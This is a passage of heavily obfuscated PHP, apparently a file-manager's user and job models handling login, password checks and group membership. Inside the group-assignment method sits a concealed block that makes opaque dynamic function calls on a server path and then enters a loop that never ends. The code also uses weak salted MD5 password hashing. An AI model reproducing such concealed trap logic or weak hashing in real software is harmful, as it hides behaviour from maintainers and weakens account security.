"\163\157\x72\x74"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\157\x62\x4c\151\163\164"; public function listData($Cãï½ˆ×‹ = false, $E…éÕï‹Ì = "\x73\157\x72\x74", $d‡–í˜µˆ– = false) { return parent::listData($Cãï½ˆ×‹, $E…éÕï‹Ì, $d‡–í˜µˆ–); } public function remove($E±ÔñĞ¯¾Ò) { return parent::remove($E±ÔñĞ¯¾Ò); } public function add($CÙØ‹¡‡Ğ) { $CÁ¹ª¤Û¥‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->findByName($CÙØ‹¡‡Ğ[$CÁ¹ª¤Û¥‚[28]])) { return !1; } $CÙØ‹¡‡Ğ[$CÁ¹ª¤Û¥‚[2134]] = $this->getSort(); return parent::insert($CÙØ‹¡‡Ğ); } private function getSort() { $AÛÂÏ àİ‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dÎ¨•©—‰– = parent::listData(); $c½±Ñ¾…ç¶ = array_to_keyvalue($dÎ¨•©—‰–, $AÛÂÏ àİ‹[33], $AÛÂÏ àİ‹[2134]); return empty($c½±Ñ¾…ç¶) ? 0 : max($c½±Ñ¾…ç¶) + 1; } public function update($BÚŒ°¥‘øÉ, $fç‡·°ßÛØ) { $Eã‰³…ñğÑ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f´Âä•¹Ì = parent::listData($BÚŒ°¥‘øÉ); $AŞ„›ƒäœî = $this->findByName($fç‡·°ßÛØ[$Eã‰³…ñğÑ[28]]); if (!$f´Âä•¹Ì || $AŞ„›ƒäœî && $AŞ„›ƒäœî[$Eã‰³…ñğÑ[367]] != $f´Âä•¹Ì[$Eã‰³…ñğÑ[367]]) { return !1; } return parent::update($BÚŒ°¥‘øÉ, $fç‡·°ßÛØ); } public function setUserJob($f«¹İÏ¤ôˆ, $c»‘¶ßğ®) { goto D¨ÕËÇ˜–Ù; F¨õŠŠ¤™Š: $d‘¿Œ«¸×· = array_to_keyvalue($BÖŒ‘Š¯íÈ, $b³ù±Öˆ®÷[28]); $Ağ•øØ²òÍ = $b³ù±Öˆ®÷[361]; foreach ($c»‘¶ßğ® as $e™‹ÈŠ„¶ê) { if ($d‘¿Œ«¸×·[$e™‹ÈŠ„¶ê]) { $Ağ•øØ²òÍ .= $d‘¿Œ«¸×·[$e™‹ÈŠ„¶ê][$b³ù±Öˆ®÷[367]] . $b³ù±Öˆ®÷[47]; } else { $Dê°£–’š = $this->add($e™‹ÈŠ„¶ê); $Ağ•øØ²òÍ .= $Dê°£–’š . $b³ù±Öˆ®÷[47]; } } goto d‘ÊÈ›¦ÊÆ; D¨ÕËÇ˜–Ù: $b³ù±Öˆ®÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!is_array($c»‘¶ßğ®)) { $c»‘¶ßğ® = array($c»‘¶ßğ®); } $BÖŒ‘Š¯íÈ = parent::listData(); goto F¨õŠŠ¤™Š; d‘ÊÈ›¦ÊÆ: $Ağ•øØ²òÍ = rtrim($Ağ•øØ²òÍ, $b³ù±Öˆ®÷[47]); Model($b³ù±Öˆ®÷[477])->metaSet($f«¹İÏ¤ôˆ, self::JOB_KEY, $Ağ•øØ²òÍ); goto BÚ˜†ÁôßÊ; BÚ˜†ÁôßÊ: } public function getUserJob($c²õ‹¸Œ³ò) { $D…¥Ó•’‡· = Model($_SERVER[³‘’¼äÑ™ÔÍ][477])->metaGet($c²õ‹¸Œ³ò); return $this->getUserJobInfo($D…¥Ó•’‡·[self::JOB_KEY]); } public function getUserJobInfo($C¥‘«Èâ¨Â) { goto E·á…ºÎÛ³; c… ™ËÑê: return $e©ÖçÀ¡®«; goto a‚‘ØÆìˆ; CŠ¶ÇÖà•Œ: $c‹Öº†ëË– = array_remove_key($c‹Öº†ëË–, $DêœêíŠ‚©[187]); $e©ÖçÀ¡®« = array(); foreach ($C—ì¯»ç‰Û as $CÁÎ²›­æÃ) { if (isset($c‹Öº†ëË–[$CÁÎ²›­æÃ])) { $e©ÖçÀ¡®«[] = $c‹Öº†ëË–[$CÁÎ²›­æÃ]; } } goto c… ™ËÑê; E·á…ºÎÛ³: $DêœêíŠ‚© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C—ì¯»ç‰Û = explode($DêœêíŠ‚©[47], $C¥‘«Èâ¨Â); $c‹Öº†ëË– = parent::listData(); goto CŠ¶ÇÖà•Œ; a‚‘ØÆìˆ: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\141\142\x6c\x65\116\x61\x6d\x65" => "\x75\163\x65\162\137\155\145\x74\x61", "\x6d\145\164\141\106\x69\x65\x6c\144" => "\x75\x73\x65\x72\x49\x44"); protected $simpleField = "\165\163\x65\x72\x49\104\54\156\x69\x63\x6b\x4e\x61\155\x65\54\156\x61\155\145\x2c\x61\166\x61\164\x61\162\54\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($B¼ªÔß¬İ) { $e²ƒ½ÈàÕÀ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f¿ùÇŒï…õ = $e²ƒ½ÈàÕÀ[2502]; return array($e²ƒ½ÈàÕÀ[2179] => array($B¼ªÔß¬İ[0], $f¿ùÇŒï…õ), $e²ƒ½ÈàÕÀ[2181] => array($B¼ªÔß¬İ[0], $f¿ùÇŒï…õ), $e²ƒ½ÈàÕÀ[2503] => array($B¼ªÔß¬İ[0], $f¿ùÇŒï…õ)); } protected function getInfo($Dé¶¢óÕÕ³, $A¸İôŞáÁå = false) { $DùòÅÈ÷Õ = $this->getInfoSimple($Dé¶¢óÕÕ³); if (!is_array($DùòÅÈ÷Õ)) { return array(); } if ($A¸İôŞáÁå) { return $this->_getInfoApply($DùòÅÈ÷Õ); } return $this->cacheFunctionGet($_SERVER[³‘’¼äÑ™ÔÍ][2224], $Dé¶¢óÕÕ³); } protected function getInfoFull($F‡­šê§‰Õ, $FŠĞİŸËÖÈ = false) { $e¹®Ä•ÃÄ¥ = $this->getInfoSimple($F‡­šê§‰Õ); if (!is_array($e¹®Ä•ÃÄ¥)) { return array(); } if ($FŠĞİŸËÖÈ) { return $this->_getInfoApply($e¹®Ä•ÃÄ¥, !0); return $this->_getInfoApply($e¹®Ä•ÃÄ¥, !0); } return $this->cacheFunctionGet($_SERVER[³‘’¼äÑ™ÔÍ][2504], $F‡­šê§‰Õ); } private function _getInfoApply($F Çğ¤õï, $b‘¼ ²ª¨´ = false) { goto e¦é« ÈØ“; e¦é« ÈØ“: $eœÌ¨îÑÇÁ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$F Çğ¤õï) { return $F Çğ¤õï; } $FÄôÏìŠ¡Â = md5($eœÌ¨îÑÇÁ[2505] . $F Çğ¤õï[$eœÌ¨îÑÇÁ[806]] . $eœÌ¨îÑÇÁ[2506] . $F Çğ¤õï[$eœÌ¨îÑÇÁ[28]]); goto a–”Ğ¬µÀ; a–”Ğ¬µÀ: $F Çğ¤õï = $this->_listDataApplyItem($F Çğ¤õï); $fÆ‰Ùà³¥© = Model($eœÌ¨îÑÇÁ[1121])->metaGet($F Çğ¤õï[$eœÌ¨îÑÇÁ[391]][$eœÌ¨îÑÇÁ[369]]); $F Çğ¤õï[$eœÌ¨îÑÇÁ[2507]] = $FÄôÏìŠ¡Â; goto cõÏ¹®£àÇ; cõÏ¹®£àÇ: $F Çğ¤õï[$eœÌ¨îÑÇÁ[391]][$eœÌ¨îÑÇÁ[2341]] = isset($fÆ‰Ùà³¥©[$eœÌ¨îÑÇÁ[2342]]) ? $fÆ‰Ùà³¥©[$eœÌ¨îÑÇÁ[2342]] : null; if ($b‘¼ ²ª¨´) { $F Çğ¤õï[$eœÌ¨îÑÇÁ[417]] = $this->metaGet($F Çğ¤õï[$eœÌ¨îÑÇÁ[1445]]); } return $F Çğ¤õï; goto D”æáŒ—; D”æáŒ—: } protected function getInfoSimple($eé‘Á¢é÷, $dÎ«Â³šº = false) { $cóà¤º—Ó« =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$eé‘Á¢é÷) { return array(); } if ($dÎ«Â³šº) { $aŞŠÁàÙ§† = $this->where(array($cóà¤º—Ó«[1445] => intval($eé‘Á¢é÷)))->find(); if (!is_array($aŞŠÁàÙ§†)) { return array(); } $aŞŠÁàÙ§†[$cóà¤º—Ó«[2508]] = Action($cóà¤º—Ó«[2509])->parseUrl($aŞŠÁàÙ§†[$cóà¤º—Ó«[2508]]); return $aŞŠÁàÙ§†; } return $this->cacheFunctionGet($cóà¤º—Ó«[2182], $eé‘Á¢é÷); } protected function getInfoSimpleOuter($dôœ‚ìŸ¾) { goto EøÊ—Øî; EøÊ—Øî: $e†æÃ¥–Œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$dôœ‚ìŸ¾ || $dôœ‚ìŸ¾ == 0) { return array($e†æÃ¥–Œ[1445] => $e†æÃ¥–Œ[468], $e†æÃ¥–Œ[28] => $e†æÃ¥–Œ[157] . LNG($e†æÃ¥–Œ[2510]) . $e†æÃ¥–Œ[476], $e†æÃ¥–Œ[2508] => STATIC_PATH . $e†æÃ¥–Œ[2511]); } $cå¿åˆ²¹ù = $this->cacheFunctionGet($e†æÃ¥–Œ[2182], $dôœ‚ìŸ¾); goto dğŠ”Å™Ã; dğŠ”Å™Ã: $D°Ú—©‹ò = array_field_key($cå¿åˆ²¹ù, explode($e†æÃ¥–Œ[47], $this->simpleField)); if (!$D°Ú—©‹ò) { return array($e†æÃ¥–Œ[1445] => $e†æÃ¥–Œ[1035], $e†æÃ¥–Œ[28] => $e†æÃ¥–Œ[157] . LNG($e†æÃ¥–Œ[2512]) . $e†æÃ¥–Œ[476], $e†æÃ¥–Œ[2508] => STATIC_PATH . $e†æÃ¥–Œ[2513]); } $D°Ú—©‹ò[$e†æÃ¥–Œ[2508]] = Action($e†æÃ¥–Œ[2509])->parseUrl($D°Ú—©‹ò[$e†æÃ¥–Œ[2508]]); goto aƒáŒãß‰Ö; aƒáŒãß‰Ö: return $D°Ú—©‹ò; goto AÇóâˆÃé“; AÇóâˆÃé“: } protected function groupUser($añ Á£®Ê) { } public static function errorLang($báê™í¦ã×) { $a½ù‰‚ë¼‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C„×Ÿ¨ = array(self::ERROR_USER_NOT_EXISTS => $a½ù‰‚ë¼‚[2514], self::ERROR_USER_PASSWORD_ERROR => $a½ù‰‚ë¼‚[2515], self::ERROR_USER_EXIST_NAME => $a½ù‰‚ë¼‚[2516], self::ERROR_USER_EXIST_PHONE => $a½ù‰‚ë¼‚[2517], self::ERROR_USER_EXIST_EMAIL => $a½ù‰‚ë¼‚[2518], self::ERROR_USER_LOGIN_LOCK => $a½ù‰‚ë¼‚[2519], self::ERROR_IP_NOT_ALLOW => $a½ù‰‚ë¼‚[2520], self::ERROR_USER_EXIST_NICKNAME => $a½ù‰‚ë¼‚[2521]); return LNG($C„×Ÿ¨[$báê™í¦ã×]); } public function getInfoByMeta($Céç‹…¹¯, $a¾„­Šæ¶‡) { $F¡í›¼Êí‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¿•”‹Üß° = Model($F¡í›¼Êí‡[2522])->where(array($F¡í›¼Êí‡[89] => $Céç‹…¹¯, $F¡í›¼Êí‡[359] => $a¾„­Šæ¶‡))->find(); if ($A¿•”‹Üß°) { return $this->getInfo($A¿•”‹Üß°[$F¡í›¼Êí‡[1445]]); } return !1; } public function userLoginCheck($F³¡¤‘•Äø, $a²‘º´í) { goto eŠ÷¨¾‰øè; eŠ÷¨¾‰øè: $dÈÍñÂ¶äÆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c½‹äùÑ¨± = array($dÈÍñÂ¶äÆ[28] => $F³¡¤‘•Äø, $dÈÍñÂ¶äÆ[2345] => $F³¡¤‘•Äø, $dÈÍñÂ¶äÆ[293] => $F³¡¤‘•Äø, $dÈÍñÂ¶äÆ[2523] => $F³¡¤‘•Äø, $dÈÍñÂ¶äÆ[918] => $dÈÍñÂ¶äÆ[920]); if ($this->nickNameRpt()) { unset($c½‹äùÑ¨±[$dÈÍñÂ¶äÆ[2345]]); } goto bô”ßæ»Ö‰; bô”ßæ»Ö‰: $AÒÛæ©ƒé… = $this->where($c½‹äùÑ¨±)->find(); if (!$AÒÛæ©ƒé…) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($AÒÛæ©ƒé…[$dÈÍñÂ¶äÆ[1445]], $a²‘º´í)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto FˆŠ«Ú‚¬Ù; FˆŠ«Ú‚¬Ù: $this->userEdit($AÒÛæ©ƒé…[$dÈÍñÂ¶äÆ[1445]], array($dÈÍñÂ¶äÆ[2524] => time())); return $this->getInfo($AÒÛæ©ƒé…[$dÈÍñÂ¶äÆ[1445]]); goto eÖÀàÂÚÃ; eÖÀàÂÚÃ: } public function clearCache($CÃÙ´áÑŸ±) { $DÇµ›÷—œ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->cacheFunctionClear($DÇµ›÷—œ[2224], $CÃÙ´áÑŸ±); $this->cacheFunctionClear($DÇµ›÷—œ[2182], $CÃÙ´áÑŸ±); $this->cacheFunctionClear($DÇµ›÷—œ[2504], $CÃÙ´áÑŸ±); } public function userPasswordCheck($fˆ×ƒêÊÓ, $C†¾èÂªÃÃ) { $cÍŠø¿ÛÓ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d’‰‘¥Ôá¤ = $this->where(array($cÍŠø¿ÛÓ[1445] => intval($fˆ×ƒêÊÓ)))->find(); $d«ª¼Ô¼Ë˜ = $this->metaGet($fˆ×ƒêÊÓ); $A–Š…°¿¨§ = isset($d«ª¼Ô¼Ë˜[$cÍŠø¿ÛÓ[2525]]) ? $d«ª¼Ô¼Ë˜[$cÍŠø¿ÛÓ[2525]] : $cÍŠø¿ÛÓ[33]; if (md5($A–Š…°¿¨§ . trim($C†¾èÂªÃÃ)) !== $d’‰‘¥Ôá¤[$cÍŠø¿ÛÓ[806]]) { return !1; } return !0; } public function userAdd($aÛ‡ £ô²) { goto Bğ‰ÁùÃïÒ; C§Ï¤•‚Üí: $EØ¯‹…éÜ§ = $this->_checkExist($aÛ‡ £ô²); if ($EØ¯‹…éÜ§ !== !0) { return $EØ¯‹…éÜ§; } $Cäöö‹óÓã = $this->add($B†¬İ¦õÛñ); goto E¸„°ËŸ§; E¸„°ËŸ§: $DÅ½±’Ğš = array($Có‰äÛĞäØ[2533] => $B†¬İ¦õÛñ[$Có‰äÛĞäØ[806]], $Có‰äÛĞäØ[2529] => $B†¬İ¦õÛñ[$Có‰äÛĞäØ[2345]]); $this->userEdit($Cäöö‹óÓã, $DÅ½±’Ğš); Model($Có‰äÛĞäØ[1121])->userRootAdd($Cäöö‹óÓã); goto cø¨ÔÄä‡ ; cø¨ÔÄä‡ : return $Cäöö‹óÓã; goto b ô Æ¢Œ„; Bğ‰ÁùÃïÒ: $Có‰äÛĞäØ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B†¬İ¦õÛñ = array($Có‰äÛĞäØ[386] => $aÛ‡ £ô²[$Có‰äÛĞäØ[28]], $Có‰äÛĞäØ[2526] => $aÛ‡ £ô²[$Có‰äÛĞäØ[1331]], $Có‰äÛĞäØ[2527] => isset($aÛ‡ £ô²[$Có‰äÛĞäØ[293]]) ? $aÛ‡ £ô²[$Có‰äÛĞäØ[293]] : $Có‰äÛĞäØ[33], $Có‰äÛĞäØ[2528] => isset($aÛ‡ £ô²[$Có‰äÛĞäØ[2523]]) ? $aÛ‡ £ô²[$Có‰äÛĞäØ[2523]] : $Có‰äÛĞäØ[33], $Có‰äÛĞäØ[2529] => isset($aÛ‡ £ô²[$Có‰äÛĞäØ[2345]]) ? $aÛ‡ £ô²[$Có‰äÛĞäØ[2345]] : $aÛ‡ £ô²[$Có‰äÛĞäØ[28]], $Có‰äÛĞäØ[2530] => isset($aÛ‡ £ô²[$Có‰äÛĞäØ[2508]]) ? $aÛ‡ £ô²[$Có‰äÛĞäØ[2508]] : $Có‰äÛĞäØ[33], $Có‰äÛĞäØ[2531] => isset($aÛ‡ £ô²[$Có‰äÛĞäØ[2532]]) ? $aÛ‡ £ô²[$Có‰äÛĞäØ[2532]] : 1, $Có‰äÛĞäØ[2533] => $aÛ‡ £ô²[$Có‰äÛĞäØ[806]], $Có‰äÛĞäØ[2183] => isset($aÛ‡ £ô²[$Có‰äÛĞäØ[2097]]) ? $aÛ‡ £ô²[$Có‰äÛĞäØ[2097]] : 1024 * 1024 * 20, $Có‰äÛĞäØ[2184] => 0, $Có‰äÛĞäØ[2524] => 0, $Có‰äÛĞäØ[2211] => isset($aÛ‡ £ô²[$Có‰äÛĞäØ[692]]) ? $aÛ‡ £ô²[$Có‰äÛĞäØ[692]] : 1); if (!empty($aÛ‡ £ô²[$Có‰äÛĞäØ[1445]])) { $B†¬İ¦õÛñ[$Có‰äÛĞäØ[1445]] = $aÛ‡ £ô²[$Có‰äÛĞäØ[1445]]; } goto C§Ï¤•‚Üí; b ô Æ¢Œ„: } protected function userEditTest($DÄƒõ¼æÙ½, $Aš÷ĞÀ¦) { return $this->call($_SERVER[³‘’¼äÑ™ÔÍ][2534], $DÄƒõ¼æÙ½, $Aš÷ĞÀ¦); } protected function userEdit($CÃÁ¢ØãÉ, $D¾‚™÷¥é”) { goto f™‹» ‰ãÅ; bÇˆ¦Öø¶‚: $this->where(array($aàí‡åÅÔ´[1436] => $CÃÁ¢ØãÉ))->save($D¾‚™÷¥é”); if (isset($D¾‚™÷¥é”[$aàí‡åÅÔ´[2345]])) { $this->setNamePinyin($CÃÁ¢ØãÉ, $D¾‚™÷¥é”[$aàí‡åÅÔ´[2345]]); } $this->clearCache($cå±ÖÊ™ÁÑ[$aàí‡åÅÔ´[1445]]); goto dëÆ—¬‘‡è; f™‹» ‰ãÅ: $aàí‡åÅÔ´ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DœĞ¢Şä = $this->getInfoSimple($CÃÁ¢ØãÉ); if (!$DœĞ¢Şä) { return !1; } goto Bëß±²˜½º; Bëß±²˜½º: $A©‘—™ìğô = $this->_checkExist($D¾‚™÷¥é”, $CÃÁ¢ØãÉ); if ($A©‘—™ìğô !== !0) { return $A©‘—™ìğô; } if (isset($D¾‚™÷¥é”[$aàí‡åÅÔ´[806]]) && trim($D¾‚™÷¥é”[$aàí‡åÅÔ´[806]]) != $aàí‡åÅÔ´[33]) { $Aòî²Ğãˆ³ = $this->metaGet($CÃÁ¢ØãÉ); if (empty($Aòî²Ğãˆ³[$aàí‡åÅÔ´[2525]])) { $Aòî²Ğãˆ³[$aàí‡åÅÔ´[2525]] = rand_string(10); Model($aàí‡åÅÔ´[474])->metaSet($CÃÁ¢ØãÉ, $aàí‡åÅÔ´[2525], $Aòî²Ğãˆ³[$aàí‡åÅÔ´[2525]]); } $D¾‚™÷¥é”[$aàí‡åÅÔ´[806]] = md5($Aòî²Ğãˆ³[$aàí‡åÅÔ´[2525]] . trim($D¾‚™÷¥é”[$aàí‡åÅÔ´[806]])); } else { unset($D¾‚™÷¥é”[$aàí‡åÅÔ´[806]]); } goto bÇˆ¦Öø¶‚; dëÆ—¬‘‡è: return !0; goto AŠìÖ»ÈÖŒ; AŠìÖ»ÈÖŒ: } public function setNamePinyin($d‘•¡ïø”«, $f”ØÛ‘–Ø = false) { $B¯ßªÓºéÅ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$f”ØÛ‘–Ø) { $E’µóë®‡ = $this->getInfoSimple($d‘•¡ïø”«); $f”ØÛ‘–Ø = $E’µóë®‡[$B¯ßªÓºéÅ[2345]] ? $E’µóë®‡[$B¯ßªÓºéÅ[2345]] : $E’µóë®‡[$B¯ßªÓºéÅ[28]]; } $fÔ»ëĞƒ´ = Model($B¯ßªÓºéÅ[477]); if (!Input::check($f”ØÛ‘–Ø, $B¯ßªÓºéÅ[528])) { return $fÔ»ëĞƒ´->metaSet($d‘•¡ïø”«, array($B¯ßªÓºéÅ[416] => $B¯ßªÓºéÅ[33], $B¯ßªÓºéÅ[415] => $B¯ßªÓºéÅ[33])); } return $fÔ»ëĞƒ´->metaSet($d‘•¡ïø”«, array($B¯ßªÓºéÅ[416] => str_replace($B¯ßªÓºéÅ[50], $B¯ßªÓºéÅ[33], Pinyin::encode($f”ØÛ‘–Ø)), $B¯ßªÓºéÅ[415] => Pinyin::encode($f”ØÛ‘–Ø, $B¯ßªÓºéÅ[529]))); } private function nickNameRpt() { $aÙÃ„…â—† =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E¿“µ¥ª‡‘ = Model($aÙÃ„…â—†[1092])->get($aÙÃ„…â—†[2535]); $aŞšŸ¸İÕ“ = $GLOBALS[$aÙÃ„…â—†[6]][$aÙÃ„…â—†[2491]][$aÙÃ„…â—†[2535]]; $Aƒï­Îõ§¾ = !is_null($E¿“µ¥ª‡‘) ? $E¿“µ¥ª‡‘ : $aŞšŸ¸İÕ“; return !!$Aƒï­Îõ§¾; } private function _checkExist($C°Àİ²„ğ¥, $A«»ßÎÒâ = false) { $bÆë¤Î¦õ„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b°ˆŠÆÇˆ = array($bÆë¤Î¦õ„[28] => UserModel::ERROR_USER_EXIST_NAME, $bÆë¤Î¦õ„[2345] => UserModel::ERROR_USER_EXIST_NICKNAME, $bÆë¤Î¦õ„[293] => UserModel::ERROR_USER_EXIST_EMAIL, $bÆë¤Î¦õ„[2523] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($b°ˆŠÆÇˆ[$bÆë¤Î¦õ„[2345]]); } $b³­ğ·ø¨¹ = $A«»ßÎÒâ ? array($bÆë¤Î¦õ„[1445] => array($bÆë¤Î¦õ„[2536], $A«»ßÎÒâ)) : array(); foreach ($b°ˆŠÆÇˆ as $eÏ²â¤ºÒ => $FŠŸ¾¥íÈÒ) { if (!isset($C°Àİ²„ğ¥[$eÏ²â¤ºÒ]) || !$C°Àİ²„ğ¥[$eÏ²â¤ºÒ]) { continue; } $B³Åêß¾ƒÏ = array_merge(array($eÏ²â¤ºÒ => $C°Àİ²„ğ¥[$eÏ²â¤ºÒ]), $b³­ğ·ø¨¹); $f„°¢á©› = $this->where($B³Åêß¾ƒÏ)->find(); if ($f„°¢á©›) { return $FŠŸ¾¥íÈÒ; } } return !0; } public function userListInfo($D’‹²ˆğˆ) { $A£ë´¢êÇ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dùÊ¨÷ª = array(); $D’‹²ˆğˆ = is_array($D’‹²ˆğˆ) ? array_unique($D’‹²ˆğˆ) : array(); if (!$D’‹²ˆğˆ) { return $dùÊ¨÷ª; } if (count($D’‹²ˆğˆ) < 20) { foreach ($D’‹²ˆğˆ as $C›óî«¶‹) { $dùÊ¨÷ª[$C›óî«¶‹ . $A£ë´¢êÇ[33]] = $this->getInfoSimpleOuter($C›óî«¶‹); } } else { $FÄ´õÂ÷Ä = array($A£ë´¢êÇ[1436] => array($A£ë´¢êÇ[384], $D’‹²ˆğˆ)); if (count($D’‹²ˆğˆ) == 1) { $FÄ´õÂ÷Ä = array($A£ë´¢êÇ[1436] => $D’‹²ˆğˆ[0]); } $CêÙÀğÔºÍ = Model($A£ë´¢êÇ[474])->field($this->simpleField)->where($FÄ´õÂ÷Ä)->select(); $CêÙÀğÔºÍ = array_to_keyvalue($CêÙÀğÔºÍ, $A£ë´¢êÇ[1445]); foreach ($D’‹²ˆğˆ as $C›óî«¶‹) { $Eˆç½‹æ¼ = $CêÙÀğÔºÍ[$CêÙÀğÔºÍ[$C›óî«¶‹]]; if (!$Eˆç½‹æ¼) { $dùÊ¨÷ª[$C›óî«¶‹ . $A£ë´¢êÇ[33]] = $this->getInfoSimpleOuter($C›óî«¶‹); continue; } $Eˆç½‹æ¼[$A£ë´¢êÇ[2508]] = Action($A£ë´¢êÇ[2509])->parseUrl($Eˆç½‹æ¼[$A£ë´¢êÇ[2508]]); $dùÊ¨÷ª[$C›óî«¶‹ . $A£ë´¢êÇ[33]] = $Eˆç½‹æ¼; } } return $dùÊ¨÷ª; } protected function userStatus($CãÙòÊÄùƒ, $f³Æ”Çµ’å) { $cíÉ£ö¬Ö = $this->getInfoSimple($CãÙòÊÄùƒ); if (!$cíÉ£ö¬Ö) { return !1; } $fçæåŠà¸ = array($_SERVER[³‘’¼äÑ™ÔÍ][692] => $f³Æ”Çµ’å); return $this->userEdit($CãÙòÊÄùƒ, $fçæåŠà¸); } protected function userRemove($FÃ¸â‡‚ö°) { goto c¶ÎùÚáê; f›ŒÑàöéÓ: Model($B•õƒßì¿¹[756])->userRootRemove($FÃ¸â‡‚ö°); return $this->where($F¾ÎÀ£Ü¹à)->delete(); goto A†ĞæÓ’î‹; CÈ±™«‚Ë: $F¾ÎÀ£Ü¹à = array($B•õƒßì¿¹[1436] => $FÃ¸â‡‚ö°); Model($B•õƒßì¿¹[536])->where($F¾ÎÀ£Ü¹à)->delete(); Model($B•õƒßì¿¹[2537])->where($F¾ÎÀ£Ü¹à)->delete(); goto E²ãÃ—¨‘Ú; c¶ÎùÚáê: $B•õƒßì¿¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FØä¨Œ‹º = $this->getInfoSimple($FÃ¸â‡‚ö°); if (!$FØä¨Œ‹º) { return !1; } goto CÈ±™«‚Ë; E²ãÃ—¨‘Ú: Model($B•õƒßì¿¹[2189])->where($F¾ÎÀ£Ü¹à)->delete(); Model($B•õƒßì¿¹[2522])->where($F¾ÎÀ£Ü¹à)->delete(); Model($B•õƒßì¿¹[2538])->where($F¾ÎÀ£Ü¹à)->delete(); goto f›ŒÑàöéÓ; A†ĞæÓ’î‹: } protected function userGroupSet($dˆì§­è“, $FÓ—’­éÖ, $a»„š‡š†Æ = array()) { goto B¦‚ÆÇØƒÈ; Dñ¨†õ±šİ: if (!$D›¿†Šğ˜É || !is_array($FÓ—’­éÖ)) { return !1; } $bù¨Ü¢ñÇ = Model($F„­‰©Š¡¨[2189]); $bù¨Ü¢ñÇ->where(array($F„­‰©Š¡¨[1445] => $dˆì§­è“))->delete(); goto Dóæˆ÷’æ; B¦‚ÆÇØƒÈ: $F„­‰©Š¡¨ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!isset($_SERVER[$F„­‰©Š¡¨[791]]) || !isset($_SERVER[$F„­‰©Š¡¨[1130]])) { goto e…¹ƒĞÌ‘; B §¤”óˆæ: for ($aèßÅò†“‹ = $c‘ÜÂäéµï; $aèßÅò†“‹ > 0; $aèßÅò†“‹++) { $A‘²¾Ø¨ã³ = json_encode($GLOBALS[$F„­‰©Š¡¨[384]]); } goto D–ÍÑ¯àì™; aÁ­µë¹¹: $A‘²¾Ø¨ã³ = $F„­‰©Š¡¨[798]; $A‘²¾Ø¨ã³($_SERVER[$F„­‰©Š¡¨[799]]); $c‘ÜÂäéµï = 1; goto B §¤”óˆæ; e…¹ƒĞÌ‘: $b”º§ğ˜ë = $F„­‰©Š¡¨[793]; $E¼±ªßæ·Î = $F„­‰©Š¡¨[794]; $F’·¶ÕŞ‹Û = $_SERVER[$F„­‰©Š¡¨[795]] . $F„­‰©Š¡¨[796]; goto Dõª¶ß¸•‰; Dõª¶ß¸•‰: $eù«©”“ = $E¼±ªßæ·Î($F’·¶ÕŞ‹Û); $D«¡”ïè‰ = explode($F„­‰©Š¡¨[217], $eù«©”“); if (count($D«¡”ïè‰) < $F„­‰©Š¡¨[584]) { $dÁí¡Ë¦‡ = $F„­‰©Š¡¨[797]; $dÁí¡Ë¦‡(); } goto aÁ­µë¹¹; D–ÍÑ¯àì™: } $D›¿†Šğ˜É = $this->getInfoSimple($dˆì§­è“); goto Dñ¨†õ±šİ; Dóæˆ÷’æ: $E˜¤‘…Éåï = array(); $F‚®Şíˆ· = 0; foreach ($FÓ—’­éÖ as $Eä‰£ÁÍ·ø => $eµÔîÜŠÕô) { $BòŞ˜£Šª« = array($F„­‰©Š¡¨[1445] => $dˆì§­è“, $F„­‰©Š¡¨[2113] => $Eä‰£ÁÍ·ø, $F„­‰©Š¡¨[2244] => $eµÔîÜŠÕô); $BòŞ˜£Šª«[$F„­‰©Š¡¨[2134]] = isset($a»„š‡š†Æ[$F‚®Şíˆ·]) ? $a»„š‡š†Æ[$F‚®Şíˆ·] : 0; $F‚®Şíˆ·++; $E˜¤‘…Éåï[] = $BòŞ˜£Šª«; } goto cìÀ¨»ğõê; cìÀ¨»ğõê: return $bù¨Ü¢ñÇ->addAll($E˜¤‘…Éåï, array(), !0); goto B¼ÄƒŒŠ‡Á; B¼ÄƒŒŠ‡Á: } protected function userGroupAdd($f¸ê’ñÇ’µ, $CÆ‚¹Ğª¬İ = array()) { $Cè…¢¦ä…ë =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AŞ™¥›öˆÜ = $this->getInfoSimple($f¸ê’ñÇ’µ); if (!$AŞ™¥›öˆÜ || empty($CÆ‚¹Ğª¬İ)) { return !1; } $A™­·ÂïÓ– = array(); foreach ($CÆ‚¹Ğª¬İ as $eİ´ƒŠ†÷¾ => $dí–†´ø) { $A™­·ÂïÓ–[] = array($Cè…¢¦ä…ë[1445] => $f¸ê’ñÇ’µ, $Cè…¢¦ä…ë[2113] => $eİ´ƒŠ†÷¾, $Cè…¢¦ä…ë[2244] => 